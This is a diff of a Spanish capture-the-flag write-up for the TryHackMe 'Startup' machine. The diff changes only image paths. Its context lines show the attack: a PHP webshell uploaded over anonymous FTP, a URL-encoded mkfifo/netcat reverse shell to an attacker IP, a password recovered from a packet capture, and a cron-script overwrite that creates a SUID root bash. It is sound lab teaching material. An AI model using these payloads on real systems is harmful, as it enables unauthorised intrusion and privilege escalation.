@@ -43,7 +43,7 @@ Escaneo completo de puertos:
 nmap -sC -sV -p- 10.130.144.165
 ```
 
-![nmap](imagenes/nmap.png)
+![nmap](Maquina_de_Linux/Startup/imagenes/nmap.png)
 
 - -sC → ejecuta scripts básicos de enumeración (NSE), que permiten detectar configuraciones comunes y posibles vulnerabilidades
 - -sV → identifica la versión de los servicios activos, lo cual es clave para buscar exploits
@@ -74,7 +74,7 @@ User: anonymous
 Password: anonymous
 ```
 
-![ftp](imagenes/ftp.png)
+![ftp](Maquina_de_Linux/Startup/imagenes/ftp.png)
 
 Si el acceso es exitoso, se listan los archivos:
 
@@ -91,7 +91,7 @@ get notice.txt
 get important.jpg
 ```
 
-![css](imagenes/get.png)
+![css](Maquina_de_Linux/Startup/imagenes/get.png)
 
 Posteriormente, se revisa el contenido del archivo de texto:
 
@@ -99,7 +99,7 @@ Posteriormente, se revisa el contenido del archivo de texto:
 cat notice.txt
 ```
 
-![css](imagenes/notice.png)
+![css](Maquina_de_Linux/Startup/imagenes/notice.png)
 
 Indica claramente:
 
@@ -139,14 +139,14 @@ En la máquina atacante (Kali) se crea un archivo PHP que permite ejecución de 
 nano shell.php
 ```
 
-![nano](imagenes/nano2.png)
+![nano](Maquina_de_Linux/Startup/imagenes/nano2.png)
 
 Contenido del archivo:
 
 ```bash
 <?php system($_GET['cmd']); ?>
 ```
-![nano](imagenes/nano.png)
+![nano](Maquina_de_Linux/Startup/imagenes/nano.png)
 
 ### 4.2 Subida del archivo al servidor FTP
 
@@ -171,7 +171,7 @@ Ahora sube el archivo
 put shell.php
 ```
 
-![put](imagenes/put.png)
+![put](Maquina_de_Linux/Startup/imagenes/put.png)
 
 
 
@@ -202,7 +202,7 @@ Resultado relevante:
 /files (Status: 301)
 ```
 
-![gobuster](imagenes/gobuster.png)
+![gobuster](Maquina_de_Linux/Startup/imagenes/gobuster.png)
 
 Esto indica que existe un directorio accesible llamado /files.
 
@@ -216,7 +216,7 @@ http://10.130.144.165/files/
 ```
 Se confirma que es un directorio expuesto públicamente.
 
-![files](imagenes/files.png)
+![files](Maquina_de_Linux/Startup/imagenes/files.png)
 
 ### 5.3 Relación FTP → Web 
 
@@ -246,7 +246,7 @@ Para verificar que la webshell funciona correctamente, se ejecuta un comando bá
 http://10.130.144.165/files/ftp/shell.php?cmd=id
 ```
 
-![shell](imagenes/shell.png)
+![shell](Maquina_de_Linux/Startup/imagenes/shell.png)
 
 Si la explotación es correcta, la respuesta del servidor será similar a:
 
@@ -273,7 +273,7 @@ En la máquina atacante:
 ```bash
 nc -lvnp 4444
 ```
-![nc](imagenes/nc.png)
+![nc](Maquina_de_Linux/Startup/imagenes/nc.png)
 
 ### 7.2 Ejecutar reverse shell desde la webshell
 
@@ -282,7 +282,7 @@ Se utiliza la webshell para lanzar una conexión inversa:
 ```bash
 http://10.130.144.165/files/ftp/shell.php?cmd=rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20192.168.142.53%204444%20%3E/tmp/f
 ```
-![nano](imagenes/nc2.png)
+![nano](Maquina_de_Linux/Startup/imagenes/nc2.png)
 
 Sustituir la IP por la de tun0 si es necesario.
 
@@ -324,7 +324,7 @@ ls -la /
 ls -la /home
 ```
 
-![nano](imagenes/ls.png)
+![nano](Maquina_de_Linux/Startup/imagenes/ls.png)
 
 Se observa:
 
@@ -338,7 +338,7 @@ Existe el usuario lennie
 ```bash
 ls -la /incidents
 ```
-![nano](imagenes/incidents.png)
+![nano](Maquina_de_Linux/Startup/imagenes/incidents.png)
 
 Resultado:
 
@@ -362,7 +362,7 @@ Esto permite su descarga desde el navegador:
 ```bash
 http://10.130.168.100/files/ftp/suspicious.pcapng
 ```
-![nano](imagenes/pcapng.png)
+![nano](Maquina_de_Linux/Startup/imagenes/pcapng.png)
 
 ## 9. Análisis del tráfico con Wireshark
 
@@ -376,7 +376,7 @@ Se aplica filtro:
 tcp.stream eq 7
 ```
 
-![tcp](imagenes/tcp.png)
+![tcp](Maquina_de_Linux/Startup/imagenes/tcp.png)
 
 Posteriormente se revisan conexiones con:
 
@@ -393,7 +393,7 @@ Se obtiene la siguiente contraseña:
 ```bash
 c4ntg3t3n0ughsp1c3
 ```
-![lennie](imagenes/lennie.png)
+![lennie](Maquina_de_Linux/Startup/imagenes/lennie.png)
 
 ## 10. Acceso por SSH
 
@@ -408,7 +408,7 @@ Contraseña:
 ```bash
 c4ntg3t3n0ughsp1c3
 ```
-![ssh](imagenes/ssh.png)
+![ssh](Maquina_de_Linux/Startup/imagenes/ssh.png)
 
 Resultado:
 
@@ -442,7 +442,7 @@ Resultado:
 THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
 ```
 
-![user](imagenes/user.png)
+![user](Maquina_de_Linux/Startup/imagenes/user.png)
 
 
 ### 11.1 Análisis del directorio scripts
@@ -464,7 +464,7 @@ startup_list.txt
 ```bash
 cat planner.sh
 ```
-![user](imagenes/planner.png)
+![user](Maquina_de_Linux/Startup/imagenes/planner.png)
 
 Contenido:
 
@@ -499,7 +499,7 @@ Se reemplaza su contenido por:
 cp /bin/bash /tmp/rootbash
 chmod u+s /tmp/rootbash
 ```
-![user](imagenes/nano3.png)
+![user](Maquina_de_Linux/Startup/imagenes/nano3.png)
 
 ## 11.5 Asignación de permisos
 
@@ -517,7 +517,7 @@ Finalmente, se obtiene acceso root:
 /tmp/rootbash -p
 ```
 
-![root](imagenes/root.png)
+![root](Maquina_de_Linux/Startup/imagenes/root.png)
 
 Resultado:
 
